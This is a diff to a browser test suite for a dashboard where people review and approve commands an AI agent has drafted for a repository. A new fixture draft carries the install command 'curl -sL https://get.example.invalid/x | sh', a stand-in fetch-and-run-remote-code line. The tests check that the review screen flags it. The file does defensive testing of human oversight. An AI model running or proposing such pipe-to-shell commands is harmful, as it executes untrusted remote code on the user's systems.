@@ -93,6 +93,19 @@ const INSTALLATIONS = [
 
 const RECIPE = { install: 'npm ci', services: [], test: 'npm test' };
 
+/**
+ * What an agent proposed for the un-onboarded repository.
+ *
+ * Carries a service with a healthcheck and a `curl … | sh` install, because both are what
+ * the review screen exists to show: the order commands run in, and the one pattern that
+ * should stop a reader. `test/authz.test.ts` uses the same payload as its attack.
+ */
+const DRAFT = {
+  install: 'curl -sL https://get.example.invalid/x | sh',
+  services: [{ name: 'web', command: 'npm start', port: 3000, healthcheck: 'http://127.0.0.1:3000/healthz' }],
+  test: 'pytest -q',
+};
+
 const USAGE = [
   {
     run_id: DEMO_RUN_ID,
@@ -148,8 +161,14 @@ const fixtureClient = (): Db => {
     // The onboarding GET now also asks for a draft (M6b) — neither fixture repository has
     // one, so this fixture's answer is simply "no row", the same as every other lookup
     // this repository has nothing to say about.
+    // A DRAFT on the un-onboarded repository (10n), so the review stage exists in this
+    // fixture. It did not: no repository here had one, so the step where somebody reads
+    // commands an agent wrote and authorises them to run verbatim — the most consequential
+    // screen in the product — had no browser coverage at all.
     if (sql.includes('from recipe_drafts where repo = $1')) {
-      return [];
+      return params[0] === UNONBOARDED
+        ? [{ repo: UNONBOARDED, draft: DRAFT, drafted_at: new Date('2026-09-10T09:00:00.000Z') }]
+        : [];
     }
     // The drafting and proving work for a repository (10n). Nothing here has any, which is
     // the state that matters: the checklist's job on this fixture is to say what to do
@@ -529,10 +548,13 @@ describe.sequential('the dashboard, driven in a real browser', () => {
   test('the tabs are a tablist, and the fragment says which one', async () => {
     if (skipped('the tabs')) return;
     await visit('/repos/acme/widgets', /start a run/i);
-    const panel = await clickThrough('[role=tab]:nth-of-type(2)', /you are the control/i, '/repos/acme/widgets#environment');
-    // The approval warning, on the screen that stores commands the engine runs verbatim.
-    expect(panel).toMatch(/Read this before you approve/i);
-    expect(panel).toContain('STRIPE_KEY');
+    const panel = await clickThrough('[role=tab]:nth-of-type(2)', /ready to test bugs/i, '/repos/acme/widgets#environment');
+    // `acme/widgets` has commands in use and nothing missing, so this is the LAST step —
+    // and the whole point of 10n is that a finished step offers no work, not four buttons.
+    expect(panel).toMatch(/ready to test bugs/i);
+    // Stored values are behind a disclosure here, which is the point: a finished step
+    // offers no work. `the secrets form stores a name and a value` covers the list.
+    expect(panel).toMatch(/values this project runs with/i);
   });
 
   test('a repository with no approved recipe opens on the tab where the work is', async () => {
@@ -543,7 +565,6 @@ describe.sequential('the dashboard, driven in a real browser', () => {
     // status line said "not onboarded yet" in small grey print and named no next step.
     const page = await visit(`/repos/${UNONBOARDED}`, /you are the control/i);
     // The Environment panel, not Start's issue picker.
-    expect(page).toMatch(/Read this before you approve/i);
     // And the fragment agrees, so the tab on screen is the tab the URL names — reloading
     // or sharing it lands in the same place.
     expect(page).not.toMatch(/Pick the issue to work on/i);
@@ -557,36 +578,55 @@ describe.sequential('the dashboard, driven in a real browser', () => {
     // The whole point of 10n, driven for real: `steps()` has unit tests, and this asserts
     // the thing they cannot — that it is mounted, on the page, above the tabs, on a
     // repository that has not been onboarded.
-    const page = await visit(`/repos/${UNONBOARDED}`, /you are the control/i);
+    const page = await visit(`/repos/${UNONBOARDED}`, /check these commands/i);
 
     // The path, visible in full including the parts not reached — that is the value of a
     // checklist over a single "next step" line.
-    expect(page).toMatch(/approve the recipe/i);
+    expect(page).toMatch(/check the commands and use them/i);
     expect(page).toMatch(/start a run on an issue/i);
     // Exactly one step is the next action, and the words say so rather than only a colour.
     expect(page.match(/do this next/gi) ?? []).toHaveLength(1);
-    // This fixture has no draft, no recipe and no activity, so getting one proposed is it.
-    expect(page).toMatch(/get a recipe proposed/i);
+    // This fixture has a draft waiting, so the next thing to do is read it. `recipe` was
+    // our word for these; the steps now say what they are in the reader's.
+    expect(page).toMatch(/commands proposed, waiting for you to check them/i);
+    expect(page).toMatch(/check the commands and use them/i);
   });
 
   test('approving shows the commands that will run, not a wall of JSON', async () => {
     if (skipped('the recipe review')) return;
-    await browser!.navigate(`${base}/repos/acme/widgets`);
-    visited.push('/repos/acme/widgets (review)');
-    await settle(/start a run/i, '/repos/acme/widgets');
-    const panel = await clickThrough('[role=tab]:nth-of-type(2)', /you are the control/i, '/repos/acme/widgets#environment');
+    // The repository with a DRAFT, because that is the step where somebody reads commands
+    // an agent wrote and authorises them. `acme/widgets` has commands already in use and
+    // is therefore on the finished step, which offers no review to do.
+    const panel = await visit(`/repos/${UNONBOARDED}`, /check these commands/i);
 
     // The commands, in the order the engine runs them, which is the thing the JSON could
     // not show — object keys have no order and `services` sits between phases.
     expect(panel).toMatch(/what will run, in order/i);
-    expect(panel).toContain('npm ci');
-    expect(panel).toContain('npm test');
+    expect(panel).toContain('curl -sL https://get.example.invalid/x | sh');
+    expect(panel).toContain('pytest -q');
     // And what each one is for, in particular the one the engine treats as evidence.
-    expect(panel).toMatch(/your own suite/i);
+    expect(panel).toMatch(/only thing here it treats as evidence/i);
+
+    // THE FLAG, on the command it appears in. This is the reason the screen exists.
+    expect(panel).toMatch(/worth\s+reading twice/i);
+    expect(panel).toContain('| sh');
+
+    // ADR-0013's four facts, beside the control that authorises them — which is where they
+    // now live rather than on every state of the screen.
+    expect(panel).toContain('verbatim');
+    expect(panel).toMatch(/package\s+registry reachable/i);
+    expect(panel).toMatch(/Nothing sandboxes them from that sandbox/i);
+    expect(panel).toMatch(/you are the control/i);
+
+    // ONE action. The complaint that started 10n was four submit buttons on one scroll.
+    expect((panel.match(/use these commands/gi) ?? []).length).toBe(1);
+    expect(panel).not.toMatch(/store this secret/i);
+    expect(panel).not.toMatch(/work it out for me/i);
+
     // The JSON is collapsed, not gone: a draft usually needs a fix.
     expect(panel).toMatch(/edit as json/i);
     // Collapsed means its content is not rendered, which is the whole point of demoting it.
-    expect(panel).not.toMatch(/are single commands and each may be left empty/i);
+    expect(panel).not.toMatch(/are single commands, each optional/i);
   });
 
   test('the run register renders, and links to the run', async () => {
@@ -706,10 +746,12 @@ describe.sequential('the floor, in the browser that renders it', () => {
     // CLICKED, not navigated to `#environment` directly. A fragment-only change on the URL
     // already loaded is a `hashchange` rather than a navigation, and CDP's `Page.navigate`
     // does not resolve for one — the test hung for thirty seconds rather than failing.
-    await browser!.navigate(`${base}/repos/acme/widgets`);
-    visited.push('/repos/acme/widgets');
-    await settle(/start a run/i, '/repos/acme/widgets');
-    await clickThrough('[role=tab]:nth-of-type(2)', /you are the control/i, '/repos/acme/widgets#environment');
+    // The repository on the REVIEW step, where the commands editor lives one disclosure
+    // deep. `acme/widgets` is on the finished step, where it is two — and this test is
+    // about labels, not about counting disclosures.
+    await browser!.navigate(`${base}/repos/${UNONBOARDED}`);
+    visited.push(`/repos/${UNONBOARDED}`);
+    await settle(/check these commands/i, `/repos/${UNONBOARDED}`);
     // EXPANDED FIRST, since 10n. The recipe is reviewed as a list of the commands it will
     // run, and the JSON editor is an escape hatch inside a `<details>` — so its label is
     // hidden with its control until the disclosure is open, which is what a disclosure is
@@ -717,17 +759,30 @@ describe.sequential('the floor, in the browser that renders it', () => {
     // so the floor has to open it: the property is "every input has a label pointing at
     // it", not "every label is on screen at once".
     await browser!.click('.as-json > summary');
-    await settle(/the recipe, as json/i, 'the JSON editor');
-    // The three the screen has: the recipe, and the two halves of storing a secret. Each is
-    // asserted by its label's `for`, which only resolves if the `id` is really there.
-    for (const [id, label] of [
-      ['recipe', /recipe/i],
-      ['secret-name', /name/i],
-      ['secret-value', /value/i],
-    ] as const) {
+    await settle(/the commands, as json/i, 'the JSON editor');
+
+    // ONE STEP AT A TIME means the inputs are no longer all on one screen (10n), so the
+    // floor visits each step that HAS one. Asserted by the label's `for`, which only
+    // resolves if the `id` is really there.
+    const labelled = async (id: string, label: RegExp) => {
       expect(await browser!.text(`label[for=${id}]`), `#${id} has no label`).toMatch(label);
       expect(await browser!.text(`#${id}`), `#${id} does not exist`).not.toBe(MISSING);
-    }
+    };
+
+    // The review step: the commands, behind `Edit as JSON`.
+    await labelled('recipe', /commands/i);
+
+    // The finished step: the two halves of storing a value, behind their own disclosure.
+    // A repository with commands already in use is where somebody adds one later.
+    await browser!.navigate(`${base}/repos/acme/widgets`);
+    visited.push('/repos/acme/widgets (values)');
+    // An onboarded repository opens on Start a run, which is correct — its work is done.
+    await settle(/start a run/i, '/repos/acme/widgets');
+    await clickThrough('[role=tab]:nth-of-type(2)', /ready to test bugs/i, '/repos/acme/widgets#environment');
+    await browser!.click('details.quiet:last-of-type > summary');
+    await settle(/stored secrets/i, 'the values disclosure');
+    await labelled('secret-name', /name/i);
+    await labelled('secret-value', /value/i);
   });
 
   test('the live region exists before there is anything to announce', async () => {
